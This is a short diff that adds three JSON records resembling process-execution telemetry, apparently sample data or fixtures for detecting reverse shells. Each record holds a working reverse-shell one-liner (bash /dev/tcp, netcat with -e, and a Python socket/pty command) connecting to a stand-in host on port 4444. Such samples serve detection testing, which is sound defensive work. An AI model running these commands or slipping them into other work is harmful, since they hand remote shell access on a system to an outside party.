@@ -1,0 +1,3 @@
+{"Image": "/bin/bash", "CommandLine": "bash -i >& /dev/tcp/198.51.100.7/4444 0>&1"}
+{"Image": "/usr/bin/nc", "CommandLine": "nc 198.51.100.7 4444 -e /bin/sh"}
+{"Image": "/usr/bin/python3", "CommandLine": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"198.51.100.7\",4444));os.dup2(s.fileno(),0);pty.spawn(\"sh\")'"}
